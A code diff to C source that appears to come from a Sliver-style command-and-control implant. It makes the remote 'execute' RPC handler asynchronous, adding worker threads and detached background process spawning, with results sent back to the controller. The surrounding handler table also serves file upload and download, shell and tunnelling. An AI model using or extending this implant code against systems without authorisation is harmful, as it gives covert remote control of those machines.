@@ -8,6 +8,7 @@
 
 #include "sliver/fs.h"
 #include "sliver/log.h"
+#include "sliver/platform.h"
 #include "sliver/proc.h"
 
 #define SLIVER_LS_MAX_ENTRIES 4096
@@ -274,38 +275,97 @@ int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out) {
 }
 
 /* --- Execute ----------------------------------------------------------- */
-int sliver_rpc_handle_execute(const sliver_envelope_t *req, sliver_buf_t *out) {
-  sliver_execute_req_t ex;
+typedef struct {
+  char path[1024];
+  char args[SLIVER_EXEC_MAX_ARGS][512];
+  size_t argc;
+  int output;
+  int background;
+  int64_t envelope_id;
+} exec_job_t;
+
+static sliver_rpc_send_fn g_rpc_send = NULL;
+
+void sliver_rpc_set_sender(sliver_rpc_send_fn fn) { g_rpc_send = fn; }
+
+static void execute_worker(void *arg) {
+  exec_job_t *job = (exec_job_t *)arg;
   const char *argv[SLIVER_EXEC_MAX_ARGS];
-  sliver_buf_t stdout_buf;
-  sliver_buf_t stderr_buf;
+  sliver_buf_t out_buf;
+  sliver_buf_t err_buf;
+  sliver_buf_t msg;
   uint32_t pid = 0;
   uint32_t status = 0;
   size_t i;
-  int rc;
+
+  for (i = 0; i < job->argc; ++i) {
+    argv[i] = job->args[i];
+  }
+  sliver_buf_init(&out_buf);
+  sliver_buf_init(&err_buf);
+  if (job->background) {
+    /* Background: report the pid and return immediately, the child lives on. */
+    sliver_child_t *child = NULL;
+    if (sliver_child_spawn(job->path, argv, job->argc, &child, &pid) == 0) {
+      status = 0;
+      /* The child runs detached; close stdin so it does not block. */
+      sliver_child_close_stdin(child);
+      sliver_child_free(child);
+    } else {
+      status = 1;
+    }
+  } else if (sliver_proc_exec(job->path, argv, job->argc, job->output, &out_buf, &err_buf, &pid,
+                              &status) != 0) {
+    status = 1;
+  }
+  sliver_buf_init(&msg);
+  if (sliver_execute_encode(&msg, status, out_buf.data, out_buf.len, err_buf.data, err_buf.len,
+                            pid, status == 1 && msg.len == 0 ? "execute: cannot start process" : NULL) == 0) {
+    if (g_rpc_send != NULL) {
+      (void)g_rpc_send(job->envelope_id, SLIVER_MSG_EXECUTE_REQ, msg.data, msg.len);
+    }
+  }
+  sliver_buf_free(&msg);
+  sliver_buf_free(&out_buf);
+  sliver_buf_free(&err_buf);
+  free(job);
+}
+
+int sliver_rpc_execute_async(const sliver_envelope_t *req) {
+  sliver_execute_req_t ex;
+  exec_job_t *job;
+  sliver_thread_t *thread;
 
   if (sliver_execute_req_decode(req->data, req->data_len, &ex) != 0) {
     return -1;
   }
-  for (i = 0; i < ex.argc; ++i) {
-    argv[i] = ex.args[i];
+  job = (exec_job_t *)calloc(1, sizeof(*job));
+  if (job == NULL) {
+    return -1;
   }
-  sliver_buf_init(&stdout_buf);
-  sliver_buf_init(&stderr_buf);
-  if (sliver_proc_exec(ex.path, argv, ex.argc, ex.output, &stdout_buf, &stderr_buf, &pid,
-                       &status) != 0) {
-    sliver_buf_free(&stdout_buf);
-    sliver_buf_free(&stderr_buf);
-    return sliver_execute_encode(out, 1, NULL, 0, NULL, 0, 0,
-                                 "execute: cannot start process");
+  (void)snprintf(job->path, sizeof(job->path), "%s", ex.path);
+  job->argc = ex.argc;
+  for (size_t i = 0; i < ex.argc; ++i) {
+    (void)snprintf(job->args[i], sizeof(job->args[i]), "%s", ex.args[i]);
   }
-  LOG_DEBUG("rpc: execute %s -> pid %u status %u (%u/%u bytes)", ex.path, pid, status,
-            (unsigned)stdout_buf.len, (unsigned)stderr_buf.len);
-  rc = sliver_execute_encode(out, status, stdout_buf.data, stdout_buf.len, stderr_buf.data,
-                             stderr_buf.len, pid, NULL);
-  sliver_buf_free(&stdout_buf);
-  sliver_buf_free(&stderr_buf);
-  return rc;
+  job->output = ex.output;
+  job->background = ex.background;
+  job->envelope_id = req->id;
+  thread = sliver_thread_create(execute_worker, job);
+  if (thread == NULL) {
+    free(job);
+    return -1;
+  }
+  return 0;
+}
+
+static int sliver_rpc_handle_execute_async_entry(const sliver_envelope_t *req,
+                                                sliver_buf_t *out) {
+  (void)out;
+  if (sliver_rpc_execute_async(req) != 0) {
+    return -1;
+  }
+  return -2; /* the worker thread answers with the request envelope id */
 }
 
 /* --- table ------------------------------------------------------------- */
@@ -320,7 +380,7 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_ENV_REQ, SLIVER_MSG_ENV, sliver_rpc_handle_env},
     {SLIVER_MSG_DOWNLOAD_REQ, SLIVER_MSG_DOWNLOAD, sliver_rpc_handle_download},
     {SLIVER_MSG_UPLOAD_REQ, SLIVER_MSG_UPLOAD, sliver_rpc_handle_upload},
-    {SLIVER_MSG_EXECUTE_REQ, SLIVER_MSG_EXECUTE_REQ, sliver_rpc_handle_execute},
+    {SLIVER_MSG_EXECUTE_REQ, SLIVER_MSG_EXECUTE_REQ, sliver_rpc_handle_execute_async_entry},
     {SLIVER_MSG_SHELL_REQ, SLIVER_MSG_SHELL, sliver_rpc_handle_shell},
     {SLIVER_MSG_TUNNEL_DATA, 0, sliver_rpc_handle_tunnel_data},
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
@@ -374,6 +434,10 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
+
+
 
 
 
